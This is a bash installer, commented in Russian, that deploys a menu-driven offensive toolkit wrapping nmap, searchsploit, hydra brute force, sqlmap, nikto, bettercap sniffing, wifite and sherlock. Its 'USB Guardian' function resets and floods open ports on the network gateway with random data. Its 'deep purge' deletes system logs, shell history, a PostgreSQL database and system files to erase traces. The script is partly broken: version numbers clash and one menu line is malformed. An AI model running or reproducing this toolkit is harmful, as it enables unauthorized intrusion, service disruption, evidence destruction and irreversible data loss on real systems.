#!/bin/bash

# VERSION 3.6 (Rescue & Sterile Edition)
CURRENT_VERSION="5.4"

TARGET_FILE="/usr/local/bin/kali_pro"
# Глобальные параметры стерильности
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

create_files() {
    cat << 'EOF' > "$TARGET_FILE"
#!/bin/bash
# VERSION=3.6
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

LOOT_DIR="$HOME/arsenal_loot"
mkdir -p "$LOOT_DIR"

# Локальные переменные внутри арсенала
INSTALL_FLAGS="-y --no-install-recommends"
PROGRESS_OPTS="-o Dpkg::Progress-Fancy=1 -o APT::Color=1"
CLEAN_OPTS="-o DPkg::Post-Invoke={'apt-get clean';} -o APT::Keep-Downloaded-Packages=false"

run_smart_check() {
    # Фоновая мини-очистка при каждом обновлении меню
    apt-get clean >/dev/null 2>&1
    python3 -c "
import shutil
def get_status(path, label):
    try:
        total, used, free = shutil.disk_usage(path)
        def fmt(b):
            if b >= 1024**3: return f'{b/1024**3:.1f}G'
            return f'{b//1024**2}MB'
        status = '\033[0;32mOK' if free > (350*1024**2) else '\033[0;31mLOW'
        print(f'   \033[0;34m[ {label} ]:\033[0m {fmt(free)} / {fmt(total)} ({status}\033[0m)')
    except: pass
get_status('/', 'СИСТЕМА')
"
}

# --- FUNCTIONS v3.6 ---

smart_nmap() {
    read -p "IP: " t
    [[ -z "$t" ]] && return
    echo -e "${BLUE}[*] Эвристический скан: $t${NC}"
    nmap -sV --open "$t" | grep "open" | tee "$LOOT_DIR/nmap_$t.txt"
    read -p "Нажми Enter..."
}

smart_searchsploit() {
    read -p "Поиск: " q
    [[ -z "$q" ]] && return
    searchsploit "$q"
    read -p "ID для копирования (пусто - выход): " id
    if [[ -n "$id" ]]; then
        cd "$LOOT_DIR" && searchsploit -m "$id"
        echo -e "${GREEN}[+] Сохранено в трофеи.${NC}"
    fi
    read -p "Нажми Enter..."
}

smart_hydra() {
    read -p "IP: " t; read -p "User: " u; read -p "Proto: " p
    [[ -z "$t" || -z "$u" || -z "$p" ]] && return
    hydra -l "$u" -P /usr/share/wordlists/rockyou.txt "$t" "$p" -V | tee -a "$LOOT_DIR/brute.txt"
    read -p "Нажми Enter..."
}

smart_sqlmap() {
    read -p "URL: " u
    [[ -z "$u" ]] && return
    sqlmap -u "$u" --batch --random-agent --output-dir="$LOOT_DIR/sqlmap"
    read -p "Нажми Enter..."
}

smart_nikto() {
    read -p "Target URL/IP: " t
    [[ -z "$t" ]] && return
    echo -e "${BLUE}[*] Запуск Nikto Scan: $t${NC}"
    nikto -h "$t" | tee "$LOOT_DIR/nikto_$t.txt"
    read -p "Enter..."
}

smart_installer() {
    read -p "Пакет для установки: " pkg
    [[ -z "$pkg" ]] && return
    
    echo -e "${CYAN}[*] Подготовка и обновление базы (необходимо)...${NC}"
    dpkg --configure -a >/dev/null 2>&1
    
    # Обновляем индексы, чтобы найти пакет
    if apt-get update; then
        echo -e "${GREEN}[+] База обновлена. Установка $pkg...${NC}"
        
        # Установка с твоими флагами стерильности
        apt-get install $INSTALL_FLAGS $PROGRESS_OPTS $CLEAN_OPTS "$pkg"
        
        # АВТОМАТИЧЕСКАЯ ОЧИСТКА (Без лишних вопросов)
        echo -e "${YELLOW}[*] Завершено. Мгновенная очистка индексов для экономии памяти...${NC}"
        rm -rf /var/lib/apt/lists/*
        apt-get autoremove -y >/dev/null 2>&1
        
        echo -e "${GREEN}[+] Готово. Пакет установлен, память возвращена.${NC}"
    else
        echo -e "${RED}[-] Ошибка: нет связи с репозиториями Kali.${NC}"
    fi
    sleep 1
}

clean_system() {
    echo -e "${CYAN}=== ГЛУБОКОЕ ОБСЛУЖИВАНИЕ (UPGRADE MODE) ===${NC}"
    apt-get update >/dev/null
    UPGRADES=$(apt-get upgrade -s | grep -P '^\d+ upgraded' | awk '{print $1}')
    if [[ "$UPGRADES" =~ ^[0-9]+$ ]] && [ "$UPGRADES" -gt 0 ]; then
        echo -e "${BLUE}[!] Обновлений: $UPGRADES. Запуск...${NC}"
        apt-get full-upgrade -y $PROGRESS_OPTS $CLEAN_OPTS
    else
        echo -e "${GREEN}[+] Обновления не требуются.${NC}"
    fi
    apt-get autoremove --purge -y >/dev/null
    apt-get clean
    echo -e "${GREEN}[+] Система оптимизирована.${NC}"
    sleep 2
}

run_sherlock() {
    read -p "Никнейм для поиска: " nick
    [[ -z "$nick" ]] && return
    echo -e "${CYAN}[*] Запуск Sherlock для: $nick...${NC}"
    sherlock "$nick" | tee "$LOOT_DIR/sherlock_$nick.txt"
    read -p "Нажми Enter..."
}

run_wifite() {
    echo -e "${YELLOW}[!] Внимание: требуется root и адаптер в Monitor Mode${NC}"
    # Запуск wifite с автоматическим убиванием конфликтующих процессов
    wifite --kill
    read -p "Нажми Enter..."
}

# --- ГЛУБОКАЯ ХИРУРГИЧЕСКАЯ ОЧИСТКА v3.9 (BLACK HOLE EDITION) ---
deep_purge() {
    echo -e "${RED}=== ТОТАЛЬНАЯ ДЕЗИНФЕКЦИЯ (BLACK HOLE) ===${NC}"
    
    # 1. Жёсткая зачистка APT и индексов
    echo -e "${YELLOW}[*] Вычищаю индексы и архивы APT...${NC}"
    apt-get clean
    apt-get autoclean -y
    rm -rf /var/lib/apt/lists/*
    rm -rf /var/cache/apt/archives/partial/*
    rm -rf "$LOOT_DIR"/*
    # 2. Удаление графики, локалей и шрифтов (самый тяжелый балласт)
    echo -e "${YELLOW}[*] Удаляю иконки, локали и шрифты...${NC}"
    rm -rf /usr/share/icons/*
    rm -rf /usr/share/locale/*
    rm -rf /usr/share/fonts/*
    rm -rf /usr/share/themes/*

    # 3. Удаление документации и справочников
    echo -e "${YELLOW}[*] Сношу мануалы и документацию...${NC}"
    rm -rf /usr/share/doc/*
    rm -rf /usr/share/man/*
    rm -rf /var/cache/man/*
    rm -rf /var/lib/apt/lists/*
    rm -rf /usr/share/icons/* /usr/share/locale/* /usr/share/doc/* /usr/share/man/*
    find /var/log -type f -delete 2>/dev/null
    rm -rf ~/.cache/pip/* /tmp/* /var/tmp/*
    # Удаление кэша шрифтов (часто весит много)
    rm -rf /var/cache/fontconfig/*

    # 4. Глубокая очистка Python (удаляем скомпилированные файлы)
    echo -e "${YELLOW}[*] Чистка Python байт-кода (.pyc)...${NC}"
    find /usr/lib/python3* -name "*.pyc" -delete 2>/dev/null
    find /usr/lib/python3* -name "__pycache__" -type d -exec rm -rf {} + 2>/dev/null
    rm -rf ~/.cache/pip/*

    # 5. Стирание системных логов и временных папок
    echo -e "${YELLOW}[*] Стерилизация логов...${NC}"
    find /var/log -type f -delete 2>/dev/null
    find /var/cache -type f -delete 2>/dev/null
    rm -rf /var/tmp/*
    rm -rf /tmp/*

    # 6. Проверка и удаление базы PostgreSQL
    if [ -d "/var/lib/postgresql" ]; then
        PG_SIZE=$(du -sm /var/lib/postgresql | awk '{print $1}')
        if [ "$PG_SIZE" -gt 50 ]; then
            echo -e "${RED}[!] Удаляю базу данных (${PG_SIZE}MB)...${NC}"
            rm -rf /var/lib/postgresql
        fi
    fi

    # 7. Стерилизация твоих "Трофеев" и истории
    rm -rf "$LOOT_DIR"/*
    history -c

    # 8. Удаление старых бэкапов конфигураций
    find /etc -name "*.bak" -delete 2>/dev/null
    find /etc -name "*.old" -delete 2>/dev/null

rm -rf ~/.cache/pip/* 2>/dev/null
find . -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null


    # Финальный аккорд: удаление неиспользуемых библиотек
    apt-get autoremove --purge -y >/dev/null 2>&1

    echo -e "${GREEN}[+] DEEP PURGE v3.9 завершен!${NC}"
    echo -ne "${BLUE}[!] Памяти доступно: ${NC}"
    df -h / | awk 'NR==2 {print $4}'
    sleep 3
}

# --- СТЕРИЛЬНЫЙ ЭВРИСТИЧЕСКИЙ МОДУЛЬ: USB GUARDIAN v4.2 ---

usb_guardian_smart() {
    WHITELIST="22,80,443,3389,8080"
    echo -e "${YELLOW}[*] Запуск стерильного анализа...${NC}"
    
    TARGET_IP=$(ip route | grep default | awk '{print $3}')
    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена.${NC}"; return; }

    # Nmap с флагом -n (без поиска DNS, чтобы не плодить кэш)
    SCAN_RES=$(nmap -n -sV --top-ports 100 --open "$TARGET_IP")
    ALL_OPEN=$(echo "$SCAN_RES" | grep "open" | awk -F'/' '{print $1}')

    for port in $ALL_OPEN; do
        if echo ",$WHITELIST," | grep -q ",$port,"; then continue; fi

        echo -e "${RED}[!!!] Подавление порта $port...${NC}"
        
        # Bettercap в режиме "silent" и без записи логов (-no-history -no-colors)
        # Направляем всё в /dev/null, чтобы не забивать память выводами
        timeout 7s bettercap -no-history -no-colors -eval "net.recon on; tcp.reset on" -target "$TARGET_IP" > /dev/null 2>&1
        
        # Если порт еще жив — используем эвристический флуд
        if nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
             ( head -c 5M < /dev/urandom | nc -nv "$TARGET_IP" "$port" ) > /dev/null 2>&1 &
             sleep 3 && kill $! 2>/dev/null
        fi
    done

    # --- МГНОВЕННАЯ ЗАЧИСТКА ХВОСТОВ ---
    echo -e "${CYAN}[*] Стерилизация временных файлов...${NC}"
    # Удаляем историю bettercap, если она успела создаться
    rm -rf ~/.bettercap_history ~/.bettercap.cap 2>/dev/null
    # Очищаем временные файлы сетевых сканеров
    rm -rf /tmp/* /var/tmp/* 2>/dev/null
    
    echo -e "${GREEN}[V] Проверка завершена. Следы удалены.${NC}"
    read -p "Нажми Enter..."
}


show_menu() {
    clear
    echo -e "${CYAN}===========================================${NC}"
    echo -e "${GREEN}      KALI SAMSUNG ARSENAL - MENU v3.7     ${NC}"
    echo -e "${CYAN}===========================================${NC}"
    run_smart_check
    echo -e "${CYAN}-------------------------------------------${NC}"
    echo -e " ${BLUE}1.${NC} РЕМОНТ/ОБНОВЛЕНИЕ  ${BLUE}2.${NC} NMAP"
    echo -e " ${BLUE}3.${NC} SEARCHSPLOIT      ${BLUE}4.${NC} HYDRA"
    echo -e " ${BLUE}5.${NC} SQLMAP            ${BLUE}6.${NC} BETTERCAP"
    echo -e " ${BLUE}7.${NC} NIKTO             ${BLUE}8.${NC} SMART INSTALLER"
    echo -e " ${YELLOW}10. SHERLOCK        11. WIFITE${NC}"
    echo -e " ${RED}9. DEEP PURGE (ОЧИСТКА)${NC}"
12. USB GUARDIAN SMART{NC}"
    echo -e " ${RED}0.${NC} ВЫХОД"
    echo -e "${CYAN}===========================================${NC}"
}

# --- MAIN LOOP ---
while true; do
    show_menu
    read -p "Опция: " opt
    case $opt in
        1) clean_system ;;
        2) smart_nmap ;;
        3) smart_searchsploit ;;
        4) smart_hydra ;;
        5) smart_sqlmap ;;
        6) bettercap -eval "net.probe on; net.sniff on" ;;
        7) smart_nikto ;;
        8) smart_installer ;;
        9) deep_purge ;;
        10) run_sherlock ;;
        11) run_wifite ;;
        12) usb_guardian_smart;;
        0) exit 0 ;;
        *) sleep 1 ;;
    esac
done
EOF

    chmod +x "$TARGET_FILE"
    echo -e "\033[0;32m[+] v$CURRENT_VERSION Ultra-Precision развернута!${NC}"
}

# Логика обновления
if [ ! -f "$TARGET_FILE" ]; then
    create_files
else
    INSTALLED_VERSION=$(grep "# VERSION=" "$TARGET_FILE" | cut -d'=' -f2)
    if [ "$INSTALLED_VERSION" != "$CURRENT_VERSION" ]; then
        create_files
    else
        echo -e "\033[0;32m[+] Файлы арсенала актуальны ($INSTALLED_VERSION).${NC}"
    fi
fi
